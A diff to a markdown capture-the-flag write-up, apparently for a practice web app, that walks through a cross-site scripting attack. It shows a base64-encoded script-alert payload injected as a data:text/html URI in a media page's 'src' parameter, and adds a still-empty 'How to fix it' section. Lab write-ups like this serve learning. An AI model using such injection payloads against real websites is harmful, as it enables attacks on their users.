@@ -13,7 +13,7 @@
 
 #### Step 1:
 
-- Go to the media page (by clicking on the NSA logo) (`/?page=media&src=nsa`)
+- Go to the media page (by clicking on the NSA logo) (`/?page=media&src=nsa`).
 
 > When you try to edit the `src` parameter, you will notice that the src is rendered in a viewer.<br>
 > You can use :
@@ -46,10 +46,21 @@ Let's try to inject a script in the `src` parameter !
 PHNjcmlwdD5hbGVydCgnZ2ltbWUgdGhlIGZsYWcnKTs8L3NjcmlwdD4=
 ```
 
+
+#### Step 3:
+
 - Inject the base64 encoded script in the `src` parameter:
 ```url
 /?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnZ2ltbWUgdGhlIGZsYWcnKTs8L3NjcmlwdD4=
 ```
+
+
+<br>
+
+
+## How to fix it:
+
+- ...
 
 
 ---
